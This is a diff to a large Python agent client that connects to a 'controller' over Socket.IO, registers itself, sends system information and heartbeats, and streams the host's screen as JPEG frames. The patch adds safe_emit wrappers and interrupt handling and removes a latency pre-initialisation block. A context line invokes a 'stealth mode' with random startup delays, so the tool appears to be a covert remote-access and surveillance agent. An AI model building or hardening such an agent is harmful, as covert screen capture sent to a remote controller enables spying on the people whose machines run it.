                 'agent_id': agent_id,
                 'current_quality': current_quality,
                 'result': result
@@ -11284,7 +11524,7 @@ def on_webrtc_adaptive_bitrate_control(data):
     except Exception as e:
         error_msg = f"WebRTC adaptive bitrate control failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_implement_frame_dropping(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11300,7 +11540,7 @@ def on_webrtc_implement_frame_dropping(data):
         if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
             # Implement frame dropping
             result = implement_frame_dropping(agent_id, load_threshold)
-            sio.emit('webrtc_frame_dropping_result', {
+            safe_emit('webrtc_frame_dropping_result', {
                 'agent_id': agent_id,
                 'load_threshold': load_threshold,
                 'result': result
@@ -11311,7 +11551,7 @@ def on_webrtc_implement_frame_dropping(data):
     except Exception as e:
         error_msg = f"WebRTC frame dropping implementation failed: {str(e)}"
         log_message(error_msg, "error")
-        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def get_webrtc_status():
     """Get comprehensive WebRTC status and capabilities."""
@@ -11346,7 +11586,7 @@ def emit_webrtc_status():
     try:
         agent_id = get_or_create_agent_id()
         status = get_webrtc_status()
-        sio.emit('webrtc_status', {'agent_id': agent_id, 'status': status})
+        safe_emit('webrtc_status', {'agent_id': agent_id, 'status': status})
         log_message(f"WebRTC status emitted: {status['enabled']}")
     except Exception as e:
         log_message(f"Failed to emit WebRTC status: {e}", "error")
@@ -11389,15 +11629,18 @@ def initialize_components():
     # Initialize WebRTC components if available
     if AIORTC_AVAILABLE:
         try:
-            # Don't initialize WebRTC during background init to avoid event loop issues
-            # WebRTC will be initialized on-demand when streaming starts
+            # Set up WebRTC event loop for async operations
+            if not asyncio.get_event_loop().is_running():
+                asyncio.set_event_loop(asyncio.new_event_loop())
+            
+            # Initialize WebRTC configuration
             global WEBRTC_ENABLED
             WEBRTC_ENABLED = True
             
-            log_message("[OK] WebRTC enabled (will initialize on-demand)")
+            log_message("[OK] WebRTC components initialized for low-latency streaming")
             log_message(f"[INFO] WebRTC ICE servers: {len(WEBRTC_ICE_SERVERS)} configured")
         except Exception as e:
-            log_message(f"[WARN] Failed to enable WebRTC: {e}")
+            log_message(f"[WARN] Failed to initialize WebRTC components: {e}")
             WEBRTC_ENABLED = False
     else:
         log_message("[INFO] WebRTC not available - using Socket.IO streaming fallback")
@@ -11669,9 +11912,12 @@ def agent_main():
                     log_message("Socket.IO not available - running in offline mode", "warning")
                     # Continue running in offline mode
                     log_message("Agent running in offline mode - no server communication")
-                    while True:
-                        time.sleep(60)  # Keep alive in offline mode
-                        # Could implement local functionality here
+                    try:
+                        while True:
+                            time.sleep(60)  # Keep alive in offline mode
+                            # Could implement local functionality here
+                    except KeyboardInterrupt:
+                        log_message("Offline mode interrupted")
                     return
                 
                 # Add connection timeout and better error handling
@@ -11715,8 +11961,12 @@ def agent_main():
                 # Manually register agent with controller
                 try:
                     log_message(f"[INFO] Registering agent {agent_id} with controller...")
-                    sio.emit('agent_connect', {'agent_id': agent_id})
-                    log_message(f"[OK] Agent {agent_id} registration sent to controller")
+                    
+                    # ✅ SAFE EMIT: Critical registration path
+                    if not safe_emit('agent_connect', {'agent_id': agent_id}):
+                        log_message(f"[ERROR] Failed to send agent registration - connection issue", "error")
+                    else:
+                        log_message(f"[OK] Agent {agent_id} registration sent to controller")
                     
                     # Send system info to controller
                     system_info = {
@@ -11732,20 +11982,36 @@ def agent_main():
                             'webrtc': AIORTC_AVAILABLE
                         }
                     }
-                    sio.emit('agent_info', system_info)
-                    log_message(f"[OK] Agent system info sent to controller")
+                    
+                    # ✅ SAFE EMIT: Critical system info
+                    if not safe_emit('agent_info', system_info):
+                        log_message(f"[ERROR] Failed to send system info - connection issue", "error")
+                    else:
+                        log_message(f"[OK] Agent system info sent to controller")
                     
                 except Exception as reg_error:
                     log_message(f"[WARN] Failed to register agent: {reg_error}")
                 
                 # Start heartbeat to keep agent visible
                 def heartbeat_worker():
-                    while sio.connected:
-                        try:
-                            sio.emit('agent_heartbeat', {'agent_id': agent_id, 'timestamp': time.time()})
-                            time.sleep(30)  # Send heartbeat every 30 seconds
-                        except Exception:
-                            break
+                    try:
+                        while sio and sio.connected:
+                            try:
+                                safe_emit('agent_heartbeat', {'agent_id': agent_id, 'timestamp': time.time()})  # ✅ SAFE
+                                time.sleep(30)  # Send heartbeat every 30 seconds
+                            except KeyboardInterrupt:
+                                log_message("Heartbeat worker interrupted")
+                                break
+                            except Exception as e:
+                                error_msg = str(e)
+                                # Silence connection errors
+                                if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+                                    log_message(f"Heartbeat error: {e}", "warning")
+                                time.sleep(5)
+                                break
+                    except KeyboardInterrupt:
+                        log_message("Heartbeat worker interrupted")
+                    log_message("Heartbeat worker stopped")
                 
                 heartbeat_thread = threading.Thread(target=heartbeat_worker, daemon=True)
                 heartbeat_thread.start()
@@ -11821,9 +12087,10 @@ def signal_handler(signum, frame):
             log_message(f"Error stopping low latency input: {e}")
         
         # Disconnect from server
-        if SOCKETIO_AVAILABLE and 'sio' in globals() and sio.connected:
+        if SOCKETIO_AVAILABLE and 'sio' in globals() and sio is not None:
             try:
-                sio.disconnect()
+                if sio.connected:
+                    sio.disconnect()
             except Exception as e:
                 log_message(f"Error disconnecting from server: {e}")
         
@@ -11904,77 +12171,6 @@ if __name__ == "__main__":
         import traceback
         traceback.print_exc()
     
-    # PRIORITY 2: Pre-Initialize Ultra-Low Latency Streaming System
-    if ULTRA_LOW_LATENCY_ENABLED:
-        try:
-            print("[STARTUP] === STREAMING PRE-INITIALIZATION ===")
-            print("[STARTUP] 🚀 Starting Ultra-Low Latency Streaming System...")
-            print("[STARTUP]    This eliminates 1-3 second delay when starting streams")
-            
-            # Import ultra-low latency module
-            try:
-                import sys
-                import os
-                
-                # Get the directory where client.py is located
-                client_dir = os.path.dirname(os.path.abspath(__file__))
-                
-                # Add to path if not already there
-                if client_dir not in sys.path:
-                    sys.path.insert(0, client_dir)
-                
-                # Also try parent directory (for different execution contexts)
-                parent_dir = os.path.dirname(client_dir)
-                if parent_dir not in sys.path:
-                    sys.path.insert(0, parent_dir)
-                
-                print(f"[STARTUP]    → Looking for ultra_low_latency.py in: {client_dir}")
-                
-                # Check if file exists
-                module_path = os.path.join(client_dir, 'ultra_low_latency.py')
-                if os.path.exists(module_path):
-                    print(f"[STARTUP]    → Found module at: {module_path}")
-                else:
-                    print(f"[STARTUP]    ⚠️  Module not found at: {module_path}")
-                    # Try workspace root
-                    workspace_root = '/workspace'
-                    if workspace_root not in sys.path:
-                        sys.path.insert(0, workspace_root)
-                    module_path = os.path.join(workspace_root, 'ultra_low_latency.py')
-                    if os.path.exists(module_path):
-                        print(f"[STARTUP]    → Found module at: {module_path}")
-                
-                from ultra_low_latency import PreInitializedStreamingSystem
-                
-                # Create pre-initialization system (runs in background)
-                # Update the global variable
-                import __main__
-                __main__.PRE_INIT_SYSTEM = PreInitializedStreamingSystem()
-                PRE_INIT_SYSTEM = __main__.PRE_INIT_SYSTEM
-                
-                print("[STARTUP] ✅ Ultra-Low Latency System initialized")
-                print("[STARTUP]    → MessagePack binary protocol ready")
-                print("[STARTUP]    → Zero-copy buffers allocated")
-                print("[STARTUP]    → Hardware encoders detected")
-                print("[STARTUP]    → Screen capture pre-warmed")
-                print("[STARTUP]    → Expected startup: <200ms (was 1-3s)")
-                print("[STARTUP]    → Expected latency: 50-100ms (was 200-300ms)")
-                
-            except ImportError as e:
-                print(f"[STARTUP] ⚠️  Ultra-low latency module not found: {e}")
-                print("[STARTUP] ⚠️  Falling back to standard streaming")
-                ULTRA_LOW_LATENCY_ENABLED = False
-            except Exception as e:
-                print(f"[STARTUP] ⚠️  Pre-initialization error: {e}")
-                print("[STARTUP] ⚠️  Falling back to standard streaming")
-                ULTRA_LOW_LATENCY_ENABLED = False
-            
-            print("[STARTUP] === STREAMING PRE-INITIALIZATION COMPLETE ===")
-        except Exception as e:
-            print(f"[STARTUP] Streaming pre-init error: {e}")
-            import traceback
-            traceback.print_exc()
-    
     # Initialize basic stealth mode
     try:
         sleep_random_non_blocking()  # Add random delay
@@ -12019,8 +12215,11 @@ if __name__ == "__main__":
         import traceback
         traceback.print_exc()
         # Continue running with basic functionality
-        while True:
-            time.sleep(60)
+        try:
+            while True:
+                time.sleep(60)
+        except KeyboardInterrupt:
+            print("Fallback mode interrupted")
     except Exception as e:
         print(f"System error: {e}")
         print("Full traceback:")
@@ -12064,85 +12263,180 @@ def screen_capture_worker(agent_id):
     if not MSS_AVAILABLE or not NUMPY_AVAILABLE or not CV2_AVAILABLE:
         log_message("Required modules not available for screen capture", "error")
         return
-    with mss.mss() as sct:
-        monitors = sct.monitors
-        monitor_index = 1 if len(monitors) > 1 else 0
-        monitor = monitors[monitor_index]
-        # mss returns monitor dicts with left/top/right/bottom; newer may include width/height
-        if isinstance(monitor, dict):
-            width = int(monitor.get('width', (monitor['right'] - monitor['left'])))
-            height = int(monitor.get('height', (monitor['bottom'] - monitor['top'])))
-        else:
-            # fallback tuple-style indexing
-            width = monitor[2] - monitor[0]
-            height = monitor[3] - monitor[1]
-        if width > 1280:
-            scale = 1280 / width
-            width = int(width * scale)
-            height = int(height * scale)
-        frame_time = 1.0 / TARGET_FPS
-        while STREAMING_ENABLED:
-            start = time.time()
-            sct_img = sct.grab(monitor if isinstance(monitor, dict) else monitors[monitor_index])
-            img = np.array(sct_img)
-            if img.shape[1] != width or img.shape[0] != height:
-                img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
-            if img.shape[2] == 4:
-                img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
-            # Non-blocking put, drop oldest if full
+    try:
+        with mss.mss() as sct:
+            monitors = sct.monitors
+            monitor_index = 1 if len(monitors) > 1 else 0
+            monitor = monitors[monitor_index]
+            # mss returns monitor dicts with left/top/right/bottom; newer may include width/height
+            if isinstance(monitor, dict):
+                width = int(monitor.get('width', (monitor['right'] - monitor['left'])))
+                height = int(monitor.get('height', (monitor['bottom'] - monitor['top'])))
+            else:
+                # fallback tuple-style indexing
+                width = monitor[2] - monitor[0]
+                height = monitor[3] - monitor[1]
+            if width > 1280:
+                scale = 1280 / width
+                width = int(width * scale)
+                height = int(height * scale)
+            frame_time = 1.0 / TARGET_FPS
+            
             try:
-                if capture_queue.full():
-                    capture_queue.get_nowait()
-                capture_queue.put_nowait(img)
-            except queue.Full:
-                pass
-            elapsed = time.time() - start
-            sleep_time = max(0, frame_time - elapsed)
-            if sleep_time > 0:
-                time.sleep(sleep_time)
+                while STREAMING_ENABLED:
+                    try:
+                        start = time.time()
+                        sct_img = sct.grab(monitor if isinstance(monitor, dict) else monitors[monitor_index])
+                        img = np.array(sct_img)
+                        if img.shape[1] != width or img.shape[0] != height:
+                            img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
+                        if img.shape[2] == 4:
+                            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+                        # Adaptive frame dropping - skip if queue too full
+                        queue_size = capture_queue.qsize()
+                        if queue_size < CAPTURE_QUEUE_SIZE:
+                            try:
+                                capture_queue.put_nowait(img)
+                            except queue.Full:
+                                pass  # Skip frame
+                        else:
+                            # Queue full, skip this frame to prevent backlog
+                            pass
+                        elapsed = time.time() - start
+                        sleep_time = max(0, frame_time - elapsed)
+                        if sleep_time > 0:
+                            time.sleep(sleep_time)
+                    except KeyboardInterrupt:
+                        log_message("Screen capture worker interrupted")
+                        break
+            except KeyboardInterrupt:
+                log_message("Screen capture worker interrupted")
+    except KeyboardInterrupt:
+        log_message("Screen capture worker interrupted")
+    
+    log_message("Screen capture stopped")
 
 def screen_encode_worker(agent_id):
     global STREAMING_ENABLED, capture_queue, encode_queue
     if not CV2_AVAILABLE:
         log_message("OpenCV not available for screen encoding", "error")
         return
-    while STREAMING_ENABLED:
-        try:
-            img = capture_queue.get(timeout=0.5)
-        except queue.Empty:
-            continue
-        # H.264 encode (for now, JPEG fallback)
-        is_success, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 80])
-        if is_success:
+    
+    try:
+        while STREAMING_ENABLED:
             try:
-                if encode_queue.full():
-                    encode_queue.get_nowait()
-                encode_queue.put_nowait(encoded.tobytes())
-            except queue.Full:
-                pass
+                try:
+                    img = capture_queue.get(timeout=0.5)
+                except queue.Empty:
+                    continue
+                # H.264 encode (for now, JPEG fallback)
+                # Dynamic JPEG quality based on queue fullness
+                queue_fullness = encode_queue.qsize() / ENCODE_QUEUE_SIZE
+                if queue_fullness > 0.8:
+                    jpeg_quality = 10  # Low quality when queue is full
+                elif queue_fullness > 0.5:
+                    jpeg_quality = 10  # Medium quality
+                else:
+                    jpeg_quality = 15  # Good quality when queue empty
+                
+                is_success, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, jpeg_quality])
+                if is_success:
+                    try:
+                        if encode_queue.full():
+                            encode_queue.get_nowait()
+                        encode_queue.put_nowait(encoded.tobytes())
+                    except queue.Full:
+                        pass
+            except KeyboardInterrupt:
+                log_message("Screen encode worker interrupted")
+                break
+    except KeyboardInterrupt:
+        log_message("Screen encode worker interrupted")
+    
+    log_message("Screen encoding stopped")
 
 def screen_send_worker(agent_id):
     global STREAMING_ENABLED, encode_queue, sio
-    while STREAMING_ENABLED:
-        try:
-            frame = encode_queue.get(timeout=0.5)
-        except queue.Empty:
-            continue
-        try:
-            # Check if socket.io is connected before sending
-            if not sio or not hasattr(sio, 'connected') or not sio.connected:
-                time.sleep(0.1)  # Wait for connection
-                continue
-            
-            # Encode frame as base64 data URL for browser display
-            frame_b64 = base64.b64encode(frame).decode('utf-8')
-            frame_data_url = f'data:image/jpeg;base64,{frame_b64}'
-            sio.emit('screen_frame', {'agent_id': agent_id, 'frame': frame_data_url})
-        except Exception as e:
-            # Only log non-namespace errors
-            if "not a connected namespace" not in str(e):
-                log_message(f"SocketIO send error: {e}", "error")
-            time.sleep(0.1)
+    
+    # Track last log time to avoid spam
+    last_disconnect_log_time = 0.0
+    
+    # FPS and bandwidth tracking
+    frame_count = 0
+    bytes_sent = 0
+    start_time = time.time()
+    last_stats_time = start_time
+    
+    # Bandwidth limit: 1 MB/s (same as camera)
+    max_bytes_per_second = 1 * 1024 * 1024
+    bytes_this_second = 0
+    second_start = time.time()
+    
+    try:
+        while STREAMING_ENABLED:
+            try:
+                try:
+                    frame = encode_queue.get(timeout=0.5)
+                except queue.Empty:
+                    continue
+                
+                # Check if socket is connected before sending
+                if not sio.connected:
+                    # Throttle disconnect log messages
+                    now = time.time()
+                    if now >= last_disconnect_log_time + 5.0:
+                        log_message("Socket.IO disconnected, deferring screen frames", "warning")
+                        last_disconnect_log_time = now
+                    time.sleep(0.5)
+                    continue
+                
+                try:
+                    # Encode frame as base64 data URL for browser display
+                    frame_b64 = base64.b64encode(frame).decode('utf-8')
+                    frame_data_url = f'data:image/jpeg;base64,{frame_b64}'
+                    safe_emit('screen_frame', {'agent_id': agent_id, 'frame': frame_data_url})
+                    
+                    # Track bandwidth and FPS
+                    frame_size = len(frame)
+                    bytes_sent += frame_size
+                    bytes_this_second += frame_size
+                    frame_count += 1
+                    
+                    # Check if we've exceeded bandwidth limit this second
+                    now = time.time()
+                    if now - second_start >= 1.0:
+                        # New second, reset counter
+                        bytes_this_second = 0
+                        second_start = now
+                    elif bytes_this_second >= max_bytes_per_second:
+                        # Hit bandwidth limit, sleep until next second
+                        sleep_time = 1.0 - (now - second_start)
+                        if sleep_time > 0:
+                            time.sleep(sleep_time)
+                        bytes_this_second = 0
+                        second_start = time.time()
+                    
+                    # Log stats every 5 seconds
+                    if now - last_stats_time >= 5.0:
+                        elapsed = now - start_time
+                        fps = frame_count / elapsed if elapsed > 0 else 0
+                        mbps = (bytes_sent / elapsed / 1024 / 1024) if elapsed > 0 else 0
+                        log_message(f"Screen stream: {fps:.1f} FPS, {mbps:.1f} MB/s, {frame_count} frames total")
+                        last_stats_time = now
+                    
+                except Exception as e:
+                    error_msg = str(e)
+                    # Silence "not a connected namespace" errors
+                    if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+                        log_message(f"SocketIO send error: {e}", "error")
+                    time.sleep(0.1)
+            except KeyboardInterrupt:
+                log_message("Screen send worker interrupted")
+                break
+    except KeyboardInterrupt:
+        log_message("Screen send worker interrupted")
+    
+    log_message("Screen send stopped")
 
 # ✅ NOW DEFINE stream_screen_h264_socketio AFTER worker functions exist
 def stream_screen_h264_socketio(agent_id):
